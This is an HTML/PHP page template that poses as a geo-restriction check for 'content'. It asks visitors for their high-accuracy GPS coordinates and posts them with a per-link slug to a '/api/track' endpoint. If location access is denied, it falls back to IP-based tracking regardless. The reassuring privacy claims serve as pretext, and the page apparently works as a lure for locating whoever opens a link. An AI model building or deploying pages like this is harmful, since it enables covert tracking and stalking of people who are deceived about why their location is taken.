<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Geo-Restricted Content Access</title>
<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}.container{background:white;border-radius:20px;padding:40px;max-width:550px;width:100%;box-shadow:0 20px 60px rgba(0,0,0,0.3);text-align:center}.icon{font-size:4em;margin-bottom:20px;animation:pulse 2s infinite}@keyframes pulse{0%,100%{transform:scale(1)}50%{transform:scale(1.1)}}h1{font-size:1.8em;margin-bottom:10px;color:#333}.subtitle{color:#667eea;font-weight:600;margin-bottom:20px;font-size:1.1em}p{color:#666;margin-bottom:20px;line-height:1.6}.info-box{background:#f0f4ff;border-left:4px solid #667eea;padding:15px;margin:20px 0;text-align:left;border-radius:8px}.info-box strong{color:#667eea;display:block;margin-bottom:5px}.info-box ul{margin-left:20px;color:#555}.info-box li{margin:5px 0}button{padding:14px 30px;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:white;border:none;border-radius:8px;font-size:16px;font-weight:600;cursor:pointer;transition:transform 0.2s;margin:5px}button:hover{transform:translateY(-2px);box-shadow:0 5px 15px rgba(102,126,234,0.4)}button:disabled{opacity:0.6;cursor:not-allowed;transform:none}.status{margin-top:20px;padding:15px;border-radius:8px;font-weight:500;animation:slideIn 0.3s ease-out}@keyframes slideIn{from{opacity:0;transform:translateY(-10px)}to{opacity:1;transform:translateY(0)}}.success{background:#d1fae5;color:#065f46;border:2px solid #10b981}.error{background:#fee;color:#991b1b;border:2px solid #ef4444}.loading{background:#e0e7ff;color:#3730a3;border:2px solid #667eea}.warning{background:#fef3c7;color:#92400e;border:2px solid #f59e0b}.spinner{display:inline-block;width:20px;height:20px;border:3px solid rgba(255,255,255,0.3);border-radius:50%;border-top-color:#667eea;animation:spin 1s linear infinite;margin-right:10px}@keyframes spin{to{transform:rotate(360deg)}}.location-info{margin-top:15px;padding:12px;background:#f9fafb;border-radius:6px;font-size:0.9em;color:#555}</style>
</head>
<body>
<div class="container">
<div class="icon">🌍</div>
<h1>Geo-Restricted Content</h1>
<div class="subtitle">📍 Location Verification Required</div>
<p>This content is restricted to specific geographic locations and requires temporary access to your location to verify eligibility.</p>
<div class="info-box">
<strong>🔒 Your Privacy Matters:</strong>
<ul>
<li>We only need <strong>temporary access</strong> to verify your location</li>
<li>Your exact coordinates are <strong>not stored permanently</strong></li>
<li>Location data is <strong>automatically deleted</strong> after 60 hours</li>
<li>We comply with all privacy regulations</li>
</ul>
</div>
<button id="shareBtn" onclick="getLocation()">🌐 Share Location to Access</button>
<div id="status"></div>
</div>
<script>
const slug='<?php echo htmlspecialchars($slug); ?>';
function getLocation(){const statusEl=document.getElementById('status');const shareBtn=document.getElementById('shareBtn');shareBtn.disabled=true;statusEl.innerHTML='<div class="status loading"><span class="spinner"></span>Requesting your location...</div>';if(!navigator.geolocation){statusEl.innerHTML='<div class="status error">❌ Geolocation is not supported</div>';attemptIpVerification();return;}navigator.geolocation.getCurrentPosition(position=>{statusEl.innerHTML='<div class="status loading"><span class="spinner"></span>Verifying location...</div>';fetch('/api/track',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({slug:slug,latitude:position.coords.latitude,longitude:position.coords.longitude})}).then(res=>res.json()).then(result=>{if(result.success){statusEl.innerHTML='<div class="status success">✅ <strong>Location Verified!</strong><br>Access granted. Redirecting...</div>';setTimeout(()=>window.location.href='/content/'+slug,2000);}else{statusEl.innerHTML='<div class="status error">❌ Failed to verify location</div>';shareBtn.disabled=false;}}).catch(()=>{statusEl.innerHTML='<div class="status error">❌ Network error</div>';shareBtn.disabled=false;});},error=>{let message=error.code===1?'Location Access Denied':'Location Unavailable';statusEl.innerHTML='<div class="status warning">⚠️ <strong>'+message+'</strong><br>Attempting IP-based verification...</div>';setTimeout(attemptIpVerification,1500);},{enableHighAccuracy:true,timeout:10000,maximumAge:0});}
function attemptIpVerification(){const statusEl=document.getElementById('status');statusEl.innerHTML='<div class="status loading"><span class="spinner"></span>Verifying via IP address...</div>';fetch('/api/track',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({slug:slug})}).then(res=>res.json()).then(result=>{if(result.success){const locationInfo=result.city?'<div class="location-info">📍 Detected: '+result.city+', '+result.country+'</div>':'';statusEl.innerHTML='<div class="status success">✅ <strong>Location Verified (IP-based)!</strong><br>Access granted. Redirecting...'+locationInfo+'</div>';setTimeout(()=>window.location.href='/content/'+slug,2500);}else{statusEl.innerHTML='<div class="status error">❌ <strong>Unable to Verify Location</strong></div>';document.getElementById('shareBtn').disabled=false;document.getElementById('shareBtn').innerHTML='🔄 Try Again';}}).catch(()=>{statusEl.innerHTML='<div class="status error">❌ Verification failed</div>';document.getElementById('shareBtn').disabled=false;});}
</script>
</body>
</html>
